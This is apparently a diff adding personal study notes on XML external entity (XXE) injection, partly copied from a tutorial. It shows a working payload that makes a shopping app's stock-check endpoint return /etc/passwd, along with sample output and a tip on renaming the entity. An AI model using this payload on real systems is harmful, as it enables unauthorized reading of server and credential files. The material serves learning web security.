@@ -1,0 +1,24 @@
+or example, suppose a shopping application checks for the stock level of a product by submitting the following XML to the server:
+
+<?xml version="1.0" encoding="UTF-8"?>
+<stockCheck><productId>381</productId></stockCheck>
+The application performs no particular defenses against XXE attacks, so you can exploit the XXE vulnerability to retrieve the /etc/passwd file by submitting the following XXE payload:
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
+<stockCheck><productId>&xxe;</productId></stockCheck>
+This XXE payload defines an external entity &xxe; whose value is the contents of the /etc/passwd file and uses the entity within the productId value. This causes the application's response to include the contents of the file:
+
+Invalid product ID: root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+...
+
+
+All you gotta do is identify that it exists
+
+Replace &xxe; with &<ANYWORD>; 
+
+and define it above in 
+
+<!DOCTYPE foo [ <!ENTITY <ANYWORD> SYSTEM "file:///etc/passwd"> ]>
